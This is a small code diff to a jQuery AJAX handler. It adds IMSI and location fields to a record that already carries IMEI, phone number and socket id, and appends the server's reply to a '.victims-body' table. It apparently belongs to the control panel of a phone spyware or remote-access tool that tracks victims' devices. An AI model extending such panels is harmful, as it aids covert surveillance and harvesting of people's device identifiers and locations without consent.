@@ -43,7 +43,9 @@ $(document).ready(function (){
                     'api' : items[4],
                     'imei' : items[5],
                     'socketid' : items[6],
-                    'phone' : items[7]
+                    'phone' : items[7],
+                    'imsi' : 'imsi',
+                    'location' : 'location'
                   },
                   success: function(data){
                     $('.victims-body').append(data.htmlresponse);
